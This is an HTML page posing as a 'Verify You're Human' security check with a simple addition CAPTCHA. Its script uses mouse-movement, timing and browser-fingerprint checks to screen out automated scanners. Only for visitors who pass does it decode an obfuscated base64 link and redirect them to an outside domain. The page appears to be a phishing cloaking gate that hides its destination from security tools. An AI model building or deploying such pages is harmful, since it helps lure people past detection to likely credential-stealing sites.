<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Check</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f2f2f2;
    }
    input, button {
      font-size: 16px;
      padding: 10px;
      margin: 10px;
    }
    #redirect-message {
      display: none;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>
  <h2>Verify You're Human</h2>
  <p id="captcha-question">Loading challenge...</p>
  <input type="number" id="captcha-answer" placeholder="Enter answer" />
  <br>
  <button onclick="verifyCaptcha()">Submit</button>
  <p id="redirect-message">Redirecting, please wait...</p>

  <!-- Hidden base64 link -->
  <a id="secret-link" href="JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U=" style="display: none;"></a>

  <script>
    let num1, num2;
    let mouseMoved = false;
    const startTime = Date.now();

    // Detect mouse movement
    window.addEventListener("mousemove", () => {
      mouseMoved = true;
    });

    // Generate a new CAPTCHA each load
    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
    }

    // Bot detection
    function isHumanLikeBrowser() {
      return (
        navigator.userAgent.length > 20 &&
        screen.width > 0 &&
        screen.height > 0 &&
        typeof window.DeviceOrientationEvent !== "undefined" &&
        'language' in navigator &&
        'platform' in navigator &&
        window.innerWidth > 0
      );
    }

    function verifyCaptcha() {
      const userAnswer = parseInt(document.getElementById("captcha-answer").value, 10);
      const timeElapsed = Date.now() - startTime;

      if (
        userAnswer === (num1 + num2) &&
        mouseMoved &&
        isHumanLikeBrowser() &&
        timeElapsed > 1500
      ) {
        document.getElementById("redirect-message").style.display = "block";
        setTimeout(() => {
          const encodedHref = document.getElementById("secret-link").getAttribute("href");
          try {
            const decoded = atob(encodedHref);
            window.location.href = decoded;
          } catch (e) {
            alert("Redirect failed. Invalid link.");
          }
        }, 1000);
      } else {
        alert("Verification failed. Try again.");
        document.getElementById("captcha-answer").value = "";
        generateCaptcha();
      }
    }

    window.onload = () => {
      generateCaptcha();
    };
  </script>
</body>
</html>
